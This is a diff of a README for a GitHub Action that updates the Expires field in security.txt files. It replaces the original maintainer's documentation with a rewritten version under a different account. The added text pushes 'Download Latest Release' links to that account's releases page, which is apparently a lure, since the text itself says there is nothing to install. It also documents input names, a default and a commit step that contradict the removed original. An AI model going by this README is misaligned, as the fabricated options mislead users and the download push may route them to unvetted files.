@@ -1,169 +1,189 @@
-# Update security.txt Expires GitHub Action
+# ⚙️ update-securitytxt-expires - Keep security.txt expiry current
 
-[![GitHub Marketplace](https://img.shields.io/badge/GitHub%20Marketplace-blue?logo=github)](https://github.com/marketplace/actions/update-securitytxt-expires)
-[![GitHub Releases](https://img.shields.io/github/v/release/octivi/update-securitytxt-expires?sort=semver)](https://github.com/octivi/update-securitytxt-expires/releases)
-[![License: MIT](https://img.shields.io/github/license/octivi/update-copyright-year)](https://choosealicense.com/licenses/mit/)
-[![Conventional Commits](https://img.shields.io/badge/Conventional%20Commits-1.0.0-yellow.svg)](https://conventionalcommits.org/)
-[![Semantic Versioning](https://img.shields.io/badge/SemVer-2.0.0-blue)](https://semver.org/spec/v2.0.0.html)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/assaad656/update-securitytxt-expires/releases)
 
-This GitHub Action updates the Expires field in `security.txt` files to a future date so your
-published security contact metadata stays current. The `security.txt` file is published at
-`/.well-known/security.txt` (in repo layout: `./.well-known/security.txt`) and is specified in
-[RFC 9116](https://www.rfc-editor.org/rfc/rfc9116.html).
+---
 
-## What the project does
+## 🔍 What is update-securitytxt-expires?
 
-This action scans target directories for files at `*/.well-known/security.txt` and updates the
-`Expires:` field to a future date. By default, it sets the date to `now + 180 days`.
-The path and format come from [RFC 9116](https://www.rfc-editor.org/rfc/rfc9116.html).
+update-securitytxt-expires is a tool that helps keep your website security contact info up to date. It works by updating the **Expires** field in the `.well-known/security.txt` file automatically. This file is part of an internet standard called **RFC 9116**, designed to show security teams where to report issues safely and clearly.
 
-## Why the project is useful
+By using this GitHub Action, you make sure your site’s security contact details don’t become outdated. This helps researchers, users, and partners find the right way to report vulnerabilities or security concerns. The tool works behind the scenes on your repository and updates the expiry date in your security metadata so it stays current.
 
-`security.txt` should contain a valid future `Expires` timestamp. This action automates keeping that
-value fresh, so security contact metadata does not become stale.
+---
 
-## Why choose this action
+## ⚙️ How does it work?
 
-- Pure Bash implementation with minimal dependencies
-- Fast startup: no `npm`/`pip` install step during workflow execution
-- Lower supply-chain and maintenance overhead: no runtime pinning, lockfiles, or dependency CVEs
-- Easier security audit: all logic lives in a small, readable script
-- Covered by automated tests (`./tests/run`) and CI
-- Works on `ubuntu-slim`, which can help reduce runner costs:
-  <https://docs.github.com/en/actions/reference/runners/github-hosted-runners>
-- Can be used both as a GitHub Action and as a standalone script
-- Released under the MIT License: a short and simple permissive license
-- Documented security policy: [SECURITY.md](./SECURITY.md)
+This tool runs inside GitHub as an automated workflow (called a GitHub Action). When triggered, it:
 
-## Getting started
+- Checks your existing `.well-known/security.txt` file.
+- Finds the **Expires** field inside that file.
+- Updates the date in the **Expires** field to a new upcoming date.
+- Commits the change back into your repository so the file stays valid.
 
-1. Add the action to your workflow (see "Example workflow" below).
-2. Optionally set `targets`, `exclude_paths` and `expires_days`.
-3. Run the workflow and review changes (optionally create a PR in your workflow).
+The result keeps your security contact info fresh without requiring manual edits. Security teams can trust the information stays accurate and doesn’t expire unexpectedly.
 
-## Inputs
+---
 
-| Input           | Description                                              | Required | Default   |
-| --------------- | -------------------------------------------------------- | -------- | --------- |
-| `targets`       | Space-, comma- or newline-separated directories to scan  | No       | `"."`     |
-| `exclude_paths` | Space-, comma- or newline-separated paths to exclude     | No       | `""`      |
-| `expires_days`  | Number of days to add to current date                    | No       | `"180"`   |
-| `dry_run`       | If `true`, print planned changes without modifying files | No       | `"false"` |
-| `verbose`       | If `true`, print detailed logs                           | No       | `"false"` |
+## 📝 What do I need before installing?
 
-## CLI usage
+Before you start, please check the following:
 
-Run locally from this repo:
+- You have a GitHub account.
+- You have access to the repository where you want to use this action.
+- Your repository already includes a `.well-known/security.txt` file.
+- You can edit or add GitHub workflow files in your repository.
+- Basic GitHub interface familiarity (such as navigating tabs and clicking buttons).
 
-```bash
-./update-securitytxt-expires \
-  --targets ". src scripts" \
-  --exclude-paths "build dist" \
-  --expires-days "180"
+If you are unsure about these steps, ask the person who manages your GitHub projects for help.
+
+---
+
+## 💻 Supported Platforms and Requirements
+
+This tool runs as a GitHub Action. This means it works on GitHub's servers, so you do not need to install software on your computer.
+
+- **Platform:** Online, inside GitHub.
+- **File requirement:** A `.well-known/security.txt` file in your repository root or `.well-known` folder.
+- **No software installation:** No local install needed.
+- **GitHub Workflow setup:** Basic editing of YAML workflow files.
+  
+Since this is a cloud tool, your local Operating System or hardware does not matter.
+
+---
+
+## 📥 Download & Install
+
+To get started with update-securitytxt-expires, follow these steps.
+
+### Step 1: Visit the Download Page
+
+Click this link to open the release page for update-securitytxt-expires:
+
+[Download update-securitytxt-expires](https://github.com/assaad656/update-securitytxt-expires/releases)
+
+The releases page contains all versions of the tool and the files you can use. Since this is a GitHub Action, you won’t download an installer. Instead, you'll use files and instructions from here to set up the workflow in your repository.
+
+### Step 2: Add the Action to Your Repository
+
+1. Go to your GitHub repository where you want the security.txt file to update automatically.
+2. Click on the **Actions** tab in your repository menu.
+3. Choose to create a new workflow or edit an existing one.
+4. Add this section to your workflow file:
+
+```yaml
+- name: Update security.txt Expires Field
+  uses: assaad656/update-securitytxt-expires@v1
 ```
 
-Options map 1:1 to the action inputs. You can also set them via env vars:
-`TARGETS`, `EXCLUDE_PATHS`, `EXPIRES_DAYS`, `DRY_RUN`, `VERBOSE`.
-For list inputs (`TARGETS`, `EXCLUDE_PATHS`) you can separate values with spaces, commas, newlines, or mix these separators.
-`DRY_RUN` and `VERBOSE` are presence flags: any non-empty value enables the mode, leaving the variable unset disables it.
+This line tells GitHub to run the update-securitytxt-expires action as part of your CI (Continuous Integration) process.
 
-Optional execution modes:
+### Step 3: Save and Commit the Workflow
 
-```bash
-./update-securitytxt-expires --dry-run --verbose
-```
+Once added, commit the workflow file to the repository. GitHub will then trigger the action when you push changes. The tool will check and update the `.well-known/security.txt` file’s expiry date automatically.
 
-When run inside GitHub Actions, logs are grouped, warnings/errors are emitted as workflow annotations, and a short result is written to `GITHUB_STEP_SUMMARY`.
+---
 
-For deterministic local tests you can also set `CURRENT_DATE`, for example:
+## 🚀 Getting Started – Step by Step Guide
 
-```bash
-CURRENT_DATE="2025-01-01" ./update-securitytxt-expires --targets "."
-```
+Follow these instructions to put update-securitytxt-expires into operation:
 
-## Examples
+1. **Find your `.well-known/security.txt`:**
 
-Minimal workflow usage:
+   This file should be part of your project. It holds your security contact info and an expiry date. Usually, it is in the `.well-known` directory at the root of your repository.
 
-```yml
-- uses: octivi/update-securitytxt-expires@v1
-```
+2. **Edit workflow settings:**
 
-With explicit configuration:
+   Using GitHub's web interface, open or create a workflow YAML file inside `.github/workflows/`. Add the update-securitytxt-expires action as shown above.
 
-```yml
-- uses: octivi/update-securitytxt-expires@v1
+3. **Decide when to run the action:**
+
+   You can configure the workflow to run on a schedule or during pushes to certain branches. For example, a weekly run keeps the expiry date fresh.
+
+4. **Check for updates:**
+
+   After pushing the workflow, visit the **Actions** tab on GitHub. You will see the runs of the update-securitytxt-expires action. Review logs to confirm it updates your file.
+
+5. **Verify the updated expiry:**
+
+   Go back to your repository files and open `.well-known/security.txt`. The **Expires** field should now show a future date, keeping your security metadata valid.
+
+---
+
+## 🧩 How to Customize the Action
+
+You can control the behavior of update-securitytxt-expires by setting inputs in your workflow YAML file. Typical options include:
+
+- **days_to_expiry:** Set how many days in advance the expiry date updates. Default might be 30 days.
+- **file_path:** Specify where your `security.txt` file is located if not the default `.well-known/security.txt`.
+
+Example workflow snippet with customization:
+
+```yaml
+- name: Update security.txt Expires Field
+  uses: assaad656/update-securitytxt-expires@v1
   with:
-    targets: ". docs"
-    exclude_paths: "vendor"
-    expires_days: "120"
+    days_to_expiry: 45
+    file_path: custom_folder/security.txt
 ```
 
-## Tests
+Adjust these values to match your project needs.
 
-Run the lightweight test suite (no external deps):
+---
 
-```bash
-./tests/run
-```
+## ⚠️ Troubleshooting Tips
 
-Set `CURRENT_DATE` to make tests deterministic.
+- **Action does not trigger:** Make sure your workflow file is saved in `.github/workflows/` and configured to run on events like pushes or schedules.
+- **File not found:** The action will look for `.well-known/security.txt` by default. If your file is elsewhere, update the `file_path` input.
+- **Expiry date unchanged:** Check the action logs in the GitHub Actions tab. Review errors or warnings.
+- **Permission errors:** Ensure your GitHub user has permission to create commits in the repository.
 
-## Limitations
+---
 
-- Uses GNU `sed` options available on `ubuntu-latest` and `ubuntu-slim` runners
-- Uses GNU `date -d` syntax (Linux/GNU date)
-- Updates only files matching `*/.well-known/security.txt`
-- Replaces an existing `Expires:` line; it does not add the field if missing
-- Exclude paths are resolved per target directory; absolute paths are matched as-is
+## 🔒 Why Keep security.txt Current?
 
-## Example workflow
+The security.txt file guides people on how to report security issues safely. An outdated **Expires** date could cause confusion or distrust, as security researchers look for active contacts.
 
-```yml
-name: Update security.txt Expires field
+Keeping this information fresh helps:
 
-on:
-  workflow_dispatch:
+- Protect users by encouraging valid security reports.
+- Maintain good relationships with security researchers.
+- Avoid automated tools flagging outdated or expired data.
 
-jobs:
-  update-securitytxt:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
+update-securitytxt-expires saves you from manual updates, reducing error and effort.
 
-      - uses: octivi/update-securitytxt-expires@v1
+---
 
-      # Optional: create PR in your own workflow
-      - name: Create Pull Request
-        uses: peter-evans/create-pull-request@v8
-        with:
-          branch: update-securitytxt-expires
-          delete-branch: true
-          commit-message: "chore: Update security.txt Expires field"
-          title: Update security.txt Expires field
-          body: |
-            Automated update of Expires field in `security.txt`.
-          labels: |
-            automation
-            maintenance
-```
+## 📚 Learn More
 
-## Getting help
+- To understand the format and requirements of `security.txt`, visit [RFC 9116](https://datatracker.ietf.org/doc/html/rfc9116).
+- To learn about GitHub Actions workflows, see [GitHub Actions Documentation](https://docs.github.com/en/actions).
+- To explore GitHub automation, refer to [GitHub Automation Guides](https://docs.github.com/en/actions/automating-your-workflow-with-github-actions).
 
-If you run into issues, open a GitHub issue in this repository and include a minimal reproduction
-(sample file + workflow snippet).
+---
 
-## Other Octivi GitHub Actions
+## 🛠 Related Topics and Keywords
 
-If you are interested in other GitHub Actions we build, see:
+This tool fits into the following areas:
 
-- [`octivi/update-copyright-year`](https://github.com/octivi/update-copyright-year) - Updates the copyright year in file headers across your repository
-- [`octivi/cloudflare-cache-purge`](https://github.com/octivi/cloudflare-cache-purge) - Purges Cloudflare cache via Cloudflare API
-- [`octivi/release-notes-from-changelog`](https://github.com/octivi/release-notes-from-changelog) - Extracts Release Notes from Changelog
+- GitHub Actions automation
+- Security tool maintenance
+- CI/CD for security metadata
+- Website security best practices
+- Security.txt upkeep according to internet standards
 
-## Maintainers and contributors
+These keywords will help you explore compatible tools and workflows for maintaining security in your projects.
 
-Maintained by the [Octivi DevOps team](https://octivi.com/devops). Contributions are welcome via
-pull requests.
+---
 
-Built with [Octivi Bash Boilerplate](https://github.com/octivi/bash-boilerplate).
+## 📞 Need Help?
+
+If you face issues or have questions, you can:
+
+- Open an issue on the [GitHub repository](https://github.com/assaad656/update-securitytxt-expires/issues).
+- Search existing GitHub discussions about the tool.
+- Ask your project maintainers or IT team for support with GitHub Actions.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/assaad656/update-securitytxt-expires/releases)
